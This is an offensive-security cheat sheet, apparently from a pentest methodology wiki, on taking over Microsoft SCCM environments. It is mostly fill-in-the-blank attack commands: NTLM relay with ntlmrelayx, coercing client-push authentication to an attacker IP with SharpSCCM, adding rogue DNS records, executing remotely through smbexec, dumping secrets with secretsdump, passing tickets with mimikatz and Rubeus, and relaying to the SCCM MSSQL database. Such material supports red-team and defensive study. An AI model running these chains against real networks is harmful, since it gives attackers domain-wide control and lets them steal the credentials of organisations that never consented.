# SCCM Relay and Takeover

SCCM's own automation is the escalation path. Automatic client push authenticates the push account to a host you control; site systems can be coerced and relayed; and relaying to the SCCM database gives control of the deployment, and therefore of every managed host.

## Why It Works

SCCM must push software to machines using a privileged account, and it stores its state in an MSSQL database. Both the push authentication and the database are reachable through relay, turning SCCM's management reach into an attacker's.

## Prerequisites

* A coercion or relay position (see Coercion & Relay)
* Any valid domain credential; some paths need SCCM-specific roles

## Execution

**Elevate-1:Relay on site systems Simple user**

* coerce sccm site server
  * `ntlmrelayx.py -tf <site_systems> -smb2support` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
    * **→ Admin on Site system**

**Elevate-2:Force client push Simple user**

* `ntlmrelayx.py -t <sccm_server> -smb2support -socks # listen connection` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
  * `SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push install` [\[tool\]](https://github.com/Mayyhem/SharpSCCM)
    * `proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
      * cleanup
        * **→ Admin**

**Elevate-3:Automatic client push Simple user**

* Create DNS A record for non existing computer x
  * `dnstool.py -u '<domain>\<user>' -p <pass> -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>` [\[tool\]](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
    * Enroll new computer x in AD then remove host SPN from the machine account
      * `setspn -D host/<newcomputer> <newcomputer> setspn -D host/<newcomputer>.<domain> <newcomputer>`
        * wait 5m for client push
          * `ntlmrelayx.py -tf <no_signing_target> -smb2support -socks` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
            * cleanup
              * **→ Relay ntlm**
                * Kerberos
                  * Pass the Ticket (ccache / kirbi)
                    * Convert Format
                      * `ticketConverter.py <kirbi||ccache> <ccache||kirbi>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py)
                    * `export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache`
                      * `impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket` [\[tool\]](https://github.com/fortra/impacket)
                        * **→ Admin**
                    * `mimikatz kerberos::ptc "<ticket>"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
                    * `Rubeus.exe ptt /ticket:<ticket>` [\[tool\]](https://github.com/GhostPack/Rubeus)
                    * `proxychains secretsdump.py -k'<domain>'/'<user>'@'<ip>'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
                    * Modify SPN
                      * `tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>" #pr 1256` [\[tool\]](https://github.com/fortra/impacket/pull/1256)
                        * **→ PassTheTicket**
                  * Aeskey
                    * `impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)` [\[tool\]](https://github.com/fortra/impacket)
                      * **→ Admin**
                    * `proxychains secretsdump.py -aesKey <key> '<domain>'/'<user>'@'<ip>'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

**Takeover-1:relay to mssql db Simple user**

* SCCM MSSQL != SSCM server
  * `sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked` [\[tool\]](https://github.com/garrettfoster13/sccmhunter)
    * `ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q "<query>"` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
      * `coerce sccm_mssql -> attacker`
        * `sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>` [\[tool\]](https://github.com/garrettfoster13/sccmhunter)
          * **→ SCCM ADMIN**

**Takeover-2:relay to mssql server Simple user**

* SCCM MSSQL != SSCM server
  * `ntlmrelayx.py -t <sccm_mssql> -smb2support -socks` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
    * coerce sccm\_server
      * `proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
        * **→ Admin MSSQL**

## Related

* [NTLM Relay](file:///9685693/coercion-relay/ntlm-relay.md) — the underlying relay technique
* [SCCM Post-Exploitation](file:///9685693/sccm/sccm-post-exploitation.md) — operating as SCCM admin afterward
